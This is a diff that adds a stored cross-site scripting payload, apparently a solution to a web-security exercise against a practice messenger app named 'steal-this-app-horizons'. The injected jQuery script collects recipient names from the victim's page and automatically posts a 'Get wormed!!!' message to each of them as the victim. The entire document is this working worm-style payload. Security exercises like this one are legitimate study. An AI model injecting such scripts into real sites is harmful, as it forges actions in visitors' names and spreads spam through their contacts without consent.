@@ -1,0 +1,20 @@
+Get Wormed!!!!!!!!
+<script type="text/javascript">
+  var messages = $('.well').children('p');
+  var arr = [];
+  for(var i = 0; i<messages.length; i=i+3){
+    var to = messages[i].innerText.split(' ').slice(1);
+    arr.push(to.join(' '));
+  }
+  // console.log(arr)
+  arr.forEach(function(to){
+    $.ajax({
+      url: 'http://steal-this-app-horizons.herokuapp.com/exercise2/messenger',
+      method: 'post',
+      data: {
+        to: to,
+        body: 'Get wormed!!!'
+      }
+    })
+  })
+</script>
